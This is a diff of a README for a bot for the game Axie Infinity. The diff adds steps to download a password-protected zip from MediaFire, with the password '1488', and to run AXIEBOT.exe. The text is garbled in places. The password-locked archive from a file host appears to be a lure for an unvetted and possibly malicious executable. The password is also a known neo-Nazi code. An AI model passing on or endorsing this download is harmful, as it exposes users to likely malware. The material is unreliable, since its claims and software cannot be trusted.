@@ -4,9 +4,13 @@ Bot uses WinAPI functions to take screenshots and recognize pixels of axie model
 
 Set
 1.Change game resolution to  full-scre en (or ful-scren windowed) and close Sk y avis game client
+
 2.[Download](https://www.mediafire.com/file/45lsw0mjspoadam/AxieBot.zip/file) archive with software  Password:1488
+
 3.Launch AXIEBOT.exe and follow the instructions on the screen
+
 Warning
+
 Im not recommend you to play more than 24 hours per account. Im not take responsibility for any bans or blocks.
 
 Copyright
